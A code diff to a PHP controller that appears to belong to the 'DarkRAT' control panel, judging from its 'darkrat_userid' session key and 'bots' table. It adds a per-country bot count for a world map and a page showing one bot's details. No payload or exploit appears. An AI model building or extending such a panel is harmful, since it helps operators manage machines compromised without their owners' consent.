@@ -4,6 +4,7 @@ class Main{
 
 
          public function index(){
+
             if(empty($_SESSION["darkrat_userid"])) {
                 die("Login Required");
             }
@@ -13,7 +14,19 @@ class Main{
             foreach ($GLOBALS["pdo"]->query($sql) as $row) {
                 $allbots[] = $row;
             }
+
+
+
+
+             $sql = "SELECT country, count(*) as NUM FROM bots GROUP BY country";
+             $return = array();
+             foreach ($GLOBALS["pdo"]->query($sql) as $row) {
+                 $return[ strtolower( $row["country"])] = intval ($row["NUM"]);
+             }
+
+
             $GLOBALS["tpl"]->assign("allbots", $allbots);
+            $GLOBALS["tpl"]->assign("worldmap", json_encode($return));
         }
 
 
@@ -116,20 +129,18 @@ class Main{
             }
         }
 
-        public function settings(Type $var = null)
+        public function settings()
         {
-
-
-
             $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM users");
             $result = $statement->execute(array());
             $users = $statement->fetchAll();
-
             $GLOBALS["tpl"]->assign("users", $users);
-
-            //   
-        
-
-            
+        }
+        public  function botinfo($id){
+            $GLOBALS["template"][0] ="Main";
+            $GLOBALS["template"][1] ="botinfo";
+            $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM bots WHERE id = ?");
+            $result = $statement->execute(array($id));
+            $GLOBALS["tpl"]->assign("botinfo", $statement->fetch(PDO::FETCH_ASSOC));
         }
 }
